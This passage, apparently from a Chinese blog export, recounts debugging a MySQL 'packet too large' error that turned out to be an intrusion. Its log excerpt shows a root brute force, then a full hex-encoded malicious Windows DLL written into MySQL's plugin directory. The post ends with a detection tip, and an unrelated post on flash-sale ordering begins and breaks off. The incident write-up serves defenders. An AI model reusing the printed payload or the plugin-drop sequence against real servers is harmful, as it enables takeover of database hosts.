server during query error if the communication packet is too large.<br>Both the client and the server have their own max_allowed_packet variable, so if you want to handle big packets, you must increase this variable both in the client and in the server.<br>按官文文档的解释是你的sql命令太长。</p>\n<h2 id=\"排查问题\"><a href=\"#排查问题\" class=\"headerlink\" title=\"排查问题\"></a>排查问题</h2><p>随即把mysql max_allowed_packet调到20M仍无法解决，网站依就无法访问数据库，仍然出现相同的错误。苦思无果之后，只有从.net mysqlclient源码查起。<br>出错源码为MysqlSteam.cs</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">SendPacket</span>(<span class=\"params\">MySqlPacket packet</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">byte</span>[] buffer = packet.Buffer;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> length = packet.Position - <span class=\"number\">4</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((<span class=\"keyword\">ulong</span>)length &gt; maxPacketSize)</span><br><span class=\"line\">        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> MySqlException(Resources.QueryTooLarge (<span class=\"keyword\">int</span>)MySqlErrorCode.PacketTooLarge);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">int</span> offset = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (length &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> lenToSend = length &gt; maxBlockSize ? maxBlockSize : length;</span><br><span class=\"line\">        buffer[offset] = (<span class=\"keyword\">byte</span>)(lenToSend &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">1</span>] = (<span class=\"keyword\">byte</span>)((lenToSend &gt;&gt; <span class=\"number\">8</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">2</span>] = (<span class=\"keyword\">byte</span>)((lenToSend &gt;&gt; <span class=\"number\">16</span>) &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">        buffer[offset + <span class=\"number\">3</span>] = sequenceByte++;</span><br><span class=\"line\">        </span><br><span class=\"line\">        outStream.Write(buffer, offset, lenToSend + <span class=\"number\">4</span>);</span><br><span class=\"line\">        outStream.Flush();</span><br><span class=\"line\">        length -= lenToSend;</span><br><span class=\"line\">        offset += lenToSend;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>查找maxPacketSize的来源<br>Driver.cs<br><figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">virtual</span> <span class=\"keyword\">void</span> <span class=\"title\">Configure</span>(<span class=\"params\">MySqlConnection connection</span>)</span><br><span class=\"line\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">bool</span> firstConfigure = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// if we have not already configured our server variables</span></span><br><span class=\"line\">    <span class=\"comment\">// then do so now</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (serverProps == <span class=\"literal\">null</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    firstConfigure = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">\t<span class=\"comment\">// if we are in a pool and the user has said it's ok to cache the</span></span><br><span class=\"line\">\t<span class=\"comment\">// properties, then grab it from the pool</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Pool != <span class=\"literal\">null</span> &amp;&amp; Settings.CacheServerProperties)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Pool.ServerProperties == <span class=\"literal\">null</span>)</span><br><span class=\"line\">          Pool.ServerProperties = LoadServerProperties(connection);</span><br><span class=\"line\">            serverProps = Pool.ServerProperties;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span></span><br><span class=\"line\">            serverProps = LoadServerProperties(connection);</span><br><span class=\"line\">        </span><br><span class=\"line\">        LoadCharacterSets(connection);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (MySqlException ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// expired password capability</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ex.Number == <span class=\"number\">1820</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            IsPasswordExpired = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">throw</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">\t.......</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (serverProps.ContainsKey(<span class=\"string\">\"max_allowed_packet\"</span>))</span><br><span class=\"line\">\t    maxPacketSize = Convert.ToInt64(serverProps[<span class=\"string\">\"max_allowed_packet\"</span>]);</span><br><span class=\"line\">\t.......</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>继续查找LoadServerProperties，仍在Driver.cs中</p>\n<figure class=\"highlight csharp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> Dictionary&lt;<span class=\"keyword\">string</span>,<span class=\"keyword\">string</span>&gt; LoadServerProperties(MySqlConnection connection)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// load server properties</span></span><br><span class=\"line\">    Dictionary&lt;<span class=\"keyword\">string</span>, <span class=\"keyword\">string</span>&gt; hash = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"keyword\">string</span>, <span class=\"keyword\">string</span>&gt;();</span><br><span class=\"line\">    MySqlCommand cmd = <span class=\"keyword\">new</span> MySqlCommand(<span class=\"string\">\"SHOW VARIABLES\"</span>, connection);</span><br><span class=\"line\">    <span class=\"keyword\">try</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">using</span> (MySqlDataReader reader = cmd.ExecuteReader())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">while</span> (reader.Read())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"keyword\">string</span> key = reader.GetString(<span class=\"number\">0</span>);</span><br><span class=\"line\">                <span class=\"keyword\">string</span> <span class=\"keyword\">value</span> = reader.GetString(<span class=\"number\">1</span>);</span><br><span class=\"line\">                hash[key] = <span class=\"keyword\">value</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// Get time zone offset as numerical value</span></span><br><span class=\"line\">        timeZoneOffset = GetTimeZoneOffset(connection);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hash;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (Exception ex)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        MySqlTrace.LogError(ThreadID, ex.Message);</span><br><span class=\"line\">        <span class=\"keyword\">throw</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>客户端的max_allowed_packet也是从服务器获取下来的.<br>所以就没办法解释这个问题，查找mysql错误日志，没有任何错误信息。最后只好把mysql普通日志打开。<br>set global general_log = on</p>\n<p>当天傍晚服务器依就挂掉，整个网站的所有页面无法访问数据库.sql日志100多m，非常不便于查看，用nodejs写了一个查找最长sql语句的方法.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var fs = require(&apos;fs&apos;);</span><br><span class=\"line\">var str = &quot;&quot;;</span><br><span class=\"line\">fs.readFile(&apos;mysql.log&apos;, &apos;utf8&apos;, function (err, data) &#123;</span><br><span class=\"line\">    if (err) throw err;</span><br><span class=\"line\">    str = data;</span><br><span class=\"line\">    searchkey = &apos;Query SELECT&apos;;</span><br><span class=\"line\">    var pos = str.indexOf(searchkey);</span><br><span class=\"line\">    var arr=new Array();</span><br><span class=\"line\">    arr[0] = pos;</span><br><span class=\"line\">    var k = 1;</span><br><span class=\"line\">    var count = 0;</span><br><span class=\"line\">    while (pos !== -1) &#123;</span><br><span class=\"line\">        count++;</span><br><span class=\"line\">        pos = str.indexOf(searchkey, pos + 1);</span><br><span class=\"line\">        arr[k] = pos;</span><br><span class=\"line\">        k++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    var max =0;</span><br><span class=\"line\">    var maxindex = 0;</span><br><span class=\"line\">    for (var i=0;i&lt;arr.length-2;i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        var temp = arr[i+1] -arr[i];</span><br><span class=\"line\">        if (temp&gt;max)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            max = temp;</span><br><span class=\"line\">            maxindex =i;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    console.log(max);</span><br><span class=\"line\">    var txt = &quot;max:&quot;+max+&quot;\\n\\r&quot;;</span><br><span class=\"line\">    txt= txt + str.substr(arr[maxindex],max)</span><br><span class=\"line\">    fs.writeFile(&apos;result.txt&apos;, txt, function (err) &#123;</span><br><span class=\"line\">        if (err) throw err;</span><br><span class=\"line\">        console.log(&apos;It\\&apos;s saved!&apos;); </span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<p>执行程序查询日志之后发现我们的mysql已被人入侵<br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">160623 18:35:05\t84 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">84 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:08\t85 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">85 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:11\t86 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">86 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:15\t87 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">87 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:17\t88 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">88 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:18\t89 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">89 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:21\t90 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">90 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:23\t91 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">91 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:26\t92 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">92 Connect\tAccess denied for user 'root'@'114.55.39.75' (using password: YES)</span><br><span class=\"line\">160623 18:35:34\t93 Connect\troot@114.55.39.75 on mysql</span><br><span class=\"line\">160623 18:35:35\t93 Query\t<span class=\"keyword\">set</span> autocommit=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">36</span>\t<span class=\"number\">93</span> Quit\t</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">37</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Connect</span>\troot@<span class=\"number\">114.55</span><span class=\"number\">.39</span><span class=\"number\">.75</span> <span class=\"keyword\">on</span> mysql</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> autocommit=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">SELECT</span> <span class=\"keyword\">VERSION</span>()</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">38</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @a = <span class=\"keyword\">concat</span>(<span class=\"string\">''</span>,<span class=\"number\">0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000E80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000EF55A8C1AB34C692AB34C692AB34C692C42BCC92AF34C692C42BC292A934C692AB34C692A834C692AB34C792B834C692C92BD592AC34C6929D12CD92A934C6925414C292AA34C69252696368AB34C692000000000000000000000000000000000000000000000000504500004C0103000E6DFF4F0000000000000000E0000E210B01060000100000001000000050000020660000006000000070000000000010001000000002000004000000000000000400000000000000008000000010000000000000020000000000100000100000000010000010000000000000100000006C71000070000000007000006C010000000000000000000000000000000000000000000000000000DC7100000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000500000001000000000000000040000000000000000000000000000800000E0555058310000000000100000006000000008000000040000000000000000000000000000400000E05550583200000000001000000070000000020000000C0000000000000000000000000000400000C0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E303400555058210D0902081292E561117752FFF14200001406000000500000260100C02F775FFE8B4C2408B801003BC8750A0C04890D21D8C2FCF676EC0C0090008B4412C7400813100432C0C3EE6FDFBE81EC34020C5355568D1810575033F6682E6E77FBDD906813808974241CC71528044DFF15315DB7BDFD0085C075208D531C8D542B515C183428D8EDD8EF52505633845123048B1B14520ADC5DFBEE08B9660033C08D7C244B20F3AB2ED375DDFF3F2850516A01565A383774073C5BB77B4D5C44B80750007FE80C03FB7BEBBA524D2835182F506A03663C568912768FFD6F2C1B4C8BAC244C0260942440398B1DFFFF7FEF74108B4D0827208B790483C9FFF2AEF7D12BF98BC18BF78BFA63DFFFFFC1E902F3A58BC883E103F3A4FFD38D8C24AC6D840694DBBB3F7303C01483BC24BC0D0275558B1BB0EEDEFD3783E804743E48740E48F6487543BF5D14EB41FF5E83E91CB4120B17150CEB2B83EFDDCFD8F802250704EB1B0620FCEB1413D6DC217F0AF0EB09E89DBA9F58B0367B6A00A107A3C1ED6B77B1A8CE8B115218F1586CEF164CF70F85D500E93513062620A8FFD6CAC9EDDD8B3D0E1C68102715FFD7886CD662C10F4AEE1406EFFFB16F840470EC3C8BF083C40885F674165614C2DBD8916C38560634190C8DBC599F139E2CAA83C177E6308BB4E11BB608802704D44889460C5154FBD8EF83C352514D40502A2C8B7E0C40750BDB162714438BAB54335F7FFCD6B84B49899F325E5D5B81C482C38B45DE2C65BB08268B386965703E4343C0691752186710422E994084080B3F256C90000F8B400C5974EB4ED8B30846405921FF25134C05B8A11B1948543108F50E39052FECBE6F59DC7E2EFF0D078B051024FE018B09CB21FD4871E0753F6880383059BEF7B7BBA314E875049EEB66832000A10DBC041FBBE1FB04001CE4E204A6FF555959EB3D6AAF8B756339269B305E21E3D8FF5FA471FC3BF072128B0E85C97407FFD11E83EE672DFD1D6CEABB83251100595E2F5885FFDF30F2C1EC538B5D08568B750C578B7D10E76DB4FFF77509833D5F00EB2683FE01740504E62287E97EF364EC09575653FFD0080C6FDDFDFBDC5E82B04E0FA3FBFFFF3389450CDF60ADAE4C17372B23F64603BBDD0ED8752634032125837D7F74115BFBD6450E083C8B025F5E5B5D9C88223B824D280000DF2E7FA877726F6E672E6F6B0328257329DBCBF6FF20706F72746E756D626572200F646F73760A7304D8FBB66925201E002728FFFFADB9002B03633A5C57696E646F77735C76332E6C6F6BBFE4BB6717612B62004374656D70040384BD6F7F3230395C6D61142E657865371F9574FFFE6973657475701A202D6F223D77DAB7EDDB221A70616263057963556E6B6E1E6CF7DEDE07546F6F2F6C64218F50585007EE6F83FC32303033302368652D6E65770BF7BF05B2387737410064006D0069006E03AFB9AE7D7300740072C9056F070D006EEC7FB2611F6C0076003100320033177013A4E1CC6D2365252750394EFDFF0B4159595354454D5C43757272656E74436FED60DBB60372AE53735C0A5C5425FE19B6B76D90616C201472609D5374617400B4BF1967A15244502D5463A4C8561484230CB2398A0AB01010806DF9FF0144656C65746546696C6541470A566DBBDD91BC45780E57690765630853FB9F66BB1D657034BD0052656743726561376BDF8E7D4B6579410E5175377956616C063969B6F717206C6F731F36CA24E0CDFDFF5F61646A7573745F666469760D5D697474DB6E6F0DD60A7370720C7466086D41F7EEED5A367066633D077075747306D36C9B796F70656E73654ED548B5B16FDB4EAD5524724164640B4C386B0276BF3D47726F7570114D6557732D5BFB9F66E25455524C446F776E578454FDFF63B36FEF00172F171D070B260827200839251610FFFFFFBF0A0B212007080E0E070705060F06071D24073F2207471406060E08060B0DEDFFAD6D180500060A150C0622125C1C005045416F8351FF4C0104000E6DFF4F43E00D210B019C7D7684062A0030130D14000F20969D278F10001004000717A40BD650272A02029AEDD9B207067022076E5CF2818CEA4F78DC4000008406922E40575C2E5BF67417B87874B8B0100342CFB6F121602E72642661CCDE2062876C0903A2402E26940CD2DC27F001303036D91CDBC04F652010BC27657353724042043E210000B8870AE5480412000000FF000000000000000000000000807C2408010F85B901000060BE006000108DBE00B0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B9070000008A07472CE83C0177F7803F0175F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE004000008B0709C0743C8B5F048D84300060000001F35083C708FF9678600000958A074708C074DC89F95748F2AE55FF967C60000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAE806000008DBE00F0FFFFBB0010000050546A045357FFD58D870702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E924ACFFFF0000000000000000000000000000000000000000000000000000000000000000000000B070000078700000000000000000000000000000BD70000090700000000000000000000000000000CA70000098700000000000000000000000000000D5700000A0700000000000000000000000000000E2700000A87000000000000000000000000000000000000000000000EC700000FA7000000A7100001A7100002871000000000000367100000000000044710000000000004A7100000000000056710000000000004B45524E454C33322E444C4C0041445641504933322E646C6C004D53564352542E646C6C004E455441504933322E646C6C0075726C6D6F6E2E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C46726565000000526567436C6F73654B65790000006672656500004E657455736572416464000055524C446F776E6C6F6164546F46696C65410000000000000E6DFF4F00000000B271000001000000030000000300000094710000A0710000AC710000301000003013000020100000BC710000C2710000CF7100000000010002006D7973716C2E646C6C007870646C33007870646C335F6465696E6974007870646C335F696E6974000000006000000C0000002D360000000000000000000000000000000000000000000000000000</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">use</span> mysql</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">drop</span> <span class=\"keyword\">table</span> <span class=\"keyword\">IF</span> <span class=\"keyword\">EXISTS</span> yongger2</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">SHOW</span> <span class=\"keyword\">WARNINGS</span></span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">create</span> <span class=\"keyword\">table</span> yongger2(<span class=\"keyword\">data</span> LONGBLOB)</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">39</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">insert</span> <span class=\"keyword\">into</span> yongger2 <span class=\"keyword\">values</span>(<span class=\"string\">\"\"</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">update</span> yongger2 <span class=\"keyword\">set</span> <span class=\"keyword\">data</span> = @a</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">concat</span>(<span class=\"string\">'select data from yongger2 into DUMPFILE \"'</span>,@@plugin_dir,<span class=\"string\">'\\\\cna12.dll\"'</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">replace</span>(@dir2,<span class=\"string\">'\\\\'</span>,<span class=\"string\">'\\\\\\\\'</span>)</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">set</span> @dir2 = <span class=\"keyword\">replace</span>(@dir2,<span class=\"string\">\"/\"</span>,<span class=\"string\">\"\\\\\\\\\"</span>)</span><br><span class=\"line\"><span class=\"number\">160623</span> <span class=\"number\">18</span>:<span class=\"number\">35</span>:<span class=\"number\">40</span>\t<span class=\"number\">94</span> <span class=\"keyword\">Query</span>\t<span class=\"keyword\">prepare</span> sql3 <span class=\"keyword\">from</span> @dir2</span><br><span class=\"line\"><span class=\"number\">94</span> <span class=\"keyword\">Prepare</span>\t<span class=\"keyword\">select</span> <span class=\"keyword\">data</span> <span class=\"keyword\">from</span> yongger2 <span class=\"keyword\">into</span> <span class=\"keyword\">DUMPFILE</span> <span class=\"string\">\"C:\\\\Program Files (x86)\\\\MySQL\\\\MySQL Server 5.6\\\\lib\\\\plugin\\\\\\\\cna12.dll\"</span></span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">....</span><br><span class=\"line\">后面<span class=\"number\">1</span>W行省略</span><br></pre></td></tr></table></figure></p>\n<p>后面的内容真是看不下去,种了无数dll到服务器上。整个服务器被控制。<br>然后。。。。我就没有然后了。。。。。。。。。。。。</p>\n<h2 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h2><p>遇到这种情况，好像只能重装系统了。<br>特别要注意的是:0x4D5A是pe文件头，如果你的日志中出现这个，请提高警觉。<br>PS:PE文件的全称是Portable Executable，意为可移植的可执行的文件，常见的EXE、DLL、OCX、SYS、COM都是PE文件，PE文件是微软Windows操作系统上的程序文件（可能是间接被执行，如DLL）</p>\n"},{"title":"电商面试题","date":"2016-02-17T16:00:00.000Z","desc":"电商 抢购 超卖","_content":"15年年底去一家电商服务公司面试，其中有一道题目是如何解决电商站点商品秒杀的相关问题。[面试题目可以参见](https://github.com/hishopdc/dc2015)。固定的数据库结构下实现三个接口，查看、下单、付款。\n<!-- more -->\n## 主要问题:高并发查询及更新数据库\n解决的方案其实比较其实并不复杂，也很常规。无非就是用缓存队列实现批量更新数据库。把下单的数据放入队列中，然后批量更新到数据库中去。说起来比较简单，实践中还是踩了一些坑。\n\n### 主要实现逻辑\n\n订单处理类\n``` CSharp\n    /// <summary>\n    /// 订单缓存队列处理类\n    /// </summary>\n    public class OrderCacheQuene\n    {\n        /// <summary>\n        /// 订单队列缓存\n        /// </summary>\n        private static List<Order> _orders;\n        /// <summary>\n        /// 数据库操作接口\n        /// </summary>\n        private static IPromotion _service;\n        /// <summary>\n        /// 锁\n        /// </summary>\n        private static object _locker = new object();\n        /// <summary>\n        /// 队列处理线程\n        /// </summary>\n        private static Thread _thread;\n\n        /// 